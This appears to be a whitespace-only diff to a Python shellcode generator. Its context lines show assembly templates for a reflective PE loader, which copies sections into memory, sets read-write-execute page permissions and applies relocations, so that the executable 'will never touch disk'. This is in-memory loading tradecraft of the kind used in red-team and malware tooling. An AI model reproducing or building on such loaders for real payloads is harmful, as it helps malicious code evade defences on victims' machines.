@@ -43,7 +43,7 @@ class Shellcode():
                    " PE will never touch disk.")
 
     arguments = {}
-    
+
     arguments["EXE"] = {}
     arguments["EXE"]["optional"] = "no"
     arguments["EXE"]["description"] = "Executable to be loaded into memory and executed"
@@ -128,7 +128,7 @@ init_dwSecIndex:
     mov [rbp - {self.storage_offsets['dwSecIndex']}], rax
 
 copy_section:
-    mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]   
+    mov rax, [rbp - {self.storage_offsets['dwSecIndex']}]
     xor r11, r11
     mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
     add rdx, {winnt._IMAGE_SECTION_HEADER.VirtualAddress.offset}
@@ -187,7 +187,7 @@ next_section:
     sub r11, r12
     mov [rbp - {self.storage_offsets['dwSectionMappedSize']}], r11
 
-page_execute_read_write:  
+page_execute_read_write:
     xor r11, r11
     mov rdx, [rbp - {self.storage_offsets['lpSectionHeaderArray']}]
     add rdx, {winnt._IMAGE_SECTION_HEADER.Characteristics.offset}
@@ -597,7 +597,7 @@ get_dwAddressOffset:
     mov rbx, [rbp - {self.storage_offsets['lpvPreferableBase']}]
     mov rcx, [rbp - {self.storage_offsets['pResponse']}]
     add rcx, rax
-    mov rax, rcx 
+    mov rax, rcx
     mov rcx, [rcx]
     sub [rax], rbx
     add [rax], r12
@@ -757,7 +757,7 @@ error:
             write_index -= 8
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
+            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
             src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
             write_index -= 4
 
